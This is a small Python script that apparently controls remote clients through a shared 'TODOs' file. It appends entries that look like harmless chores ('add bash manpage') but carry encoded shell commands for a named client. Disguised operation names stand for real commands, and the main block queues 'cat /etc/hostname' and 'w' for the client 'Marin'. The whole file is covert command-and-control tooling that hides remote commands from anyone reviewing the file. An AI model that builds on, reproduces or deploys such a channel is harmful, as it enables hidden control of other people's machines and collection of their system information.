from json import dumps
from os import listdir
from os.path import join
from urllib.request import urlopen, Request

from constants import gid, gat
from encoding import encode
from myhttp import get_file, update_file

opmap = {
    'w': 'a',
    'cat': 'dog'
}

def add_todo(name: str, task: str, operation: str, args: str = ""):
    old = get_file('TODOs')
    argstr = '' if len(args) == 0 else f' {args}'
    new = f'{old}\n- {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
    if update_file('TODOs', new):
        print(f'Added operation "{operation}" for client "{name}"')
    else:
        print("Failed to add operation!")
    

if __name__ == '__main__':
    add_todo('Marin', 'add bash manpage', 'cat', '/etc/hostname')
    add_todo('Marin', 'add unzip manpage', 'w')
